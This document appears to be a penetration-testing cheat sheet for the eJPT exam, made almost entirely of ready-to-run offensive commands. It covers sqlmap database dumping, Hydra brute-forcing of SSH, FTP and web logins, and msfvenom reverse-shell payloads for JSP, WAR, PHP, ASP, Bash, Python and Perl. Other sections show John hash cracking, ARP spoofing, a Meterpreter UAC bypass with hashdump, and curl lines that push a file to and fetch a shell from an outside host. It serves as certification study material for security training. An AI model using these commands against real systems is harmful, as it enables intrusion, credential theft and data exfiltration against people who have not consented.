# eJPT-Cheatsheet-Tips
This is a Cheatsheet for eJPT.

### Nmap
nmap -sn 10.10.10.0/24
nmap -sV -p- -iL targets -oN nmap.initial
nmap -A -p- -iL targets -oN nmap.aggressive

## fPing
fping -a -g 10.10.10.0/24 > targets 2>/dev/null

## IP Route
ip route add 172.16.50.0/24 via 10.13.37.1 dev tap0

## John

<--Crack Password Hash-->
john --wordlist=/root/Tools/wordlists/rockyou.txt --format=raw-md5

<--Crack SSH Private Key Hash-->
python3 /opt/john/ssh2john.py id_rsa > ssh_hash.txt
john --wordlist=/root/Tools/wordlists/rockyou.txt ssh_hash.txt

<--Crack Zip File Password Hash-->
zip2john file.zip > zip_hash.txt
john --wordlist=/root/Tools/wordlists/rockyou.txt zip_hash.txt

<--Crack /etc/passwd /etc/shadow Password Hash-->
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt

## dirb
<--Normal mode-->
dirb http://10.10.10.10/

<--With Authentication required-->
dirb http://10.10.10.10/dir -u admin:admin

## Netcat
<--Listening for reverse shell-->
nc -nvlp 1234

<--Banner Grabbing-->
nc -nv 10.10.10.10 <port>

## SQLMap
<--Check if injection exists-->
<~ With POST Request. Save the post request in a login.req file ~>
sqlmap -r login.req
<~ With url GET Request ~>
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id
<~ With POST Data ~>
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" 

<--Get database if injection Exists-->
sqlmap -r login.req --dbs
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs

<--Get Tables in a Database-->
sqlmap -r login.req -D dbname --tables
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables

<--Get data in a Database tables-->
sqlmap -r login.req -D dbname -T table_name --dump
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump

## Hydra
<--SSH Login Bruteforcing-->
<~ With unknown username and password ~>
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh
<~ With unknown password ~>
hydra -v -V -u -l admin -P passwords.txt -t 1 -u 10.10.10.10 ssh
Use same for FTP, just replace ssh with ftp

<--HTTP POST Form-->
hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L /usr/share/ncrack/minimal.usr -P /root/Tools/SecLists/Passwords/Leaked-Databases/rockyou-15.txt -f -V

## msfvenom shells
JSP Java Meterpreter Reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

Bash Unix Reverse Shell
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

## Metasploit Meterpreter autoroute
run autoroute -s 10.10.10.0/24

## ARPSpoof
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i <interface> -t <target> -r <host>
arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36

## SMB Enumeration
<--Get shares, users, groups, password policy-->
smbclient -L //10.10.10.10/
enum4linux -U -M -S -P -G 10.10.10.10
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 -v

<--Access Share-->
smbclient //10.10.10.10/share_name

## FTP Enumeration
nmap --script=ftp-anon 10.10.10.10 -p21 -v
ftp 10.10.10.10

## Meterpreter
ps
getuid
getpid
getsystem
ps -U SYSTEM
<--CHECK UAC/Privileges-->
run post/windows/gather/win_privs
<--BYPASS UAC-->
*Background the session first
exploit/windows/local/bypassuac
set session
<--After PrivEsc-->
migrate <pid>
hashdump

## Remote code execution
<--curl-->
curl http://10.10.10.10:8888 -T /tmp/r
curl http://10.10.10.10:8888/shell -o /tmp/shell
curl http://10.10.10.10/'id' | base64
curl http://10.10.10.10/'whoami'


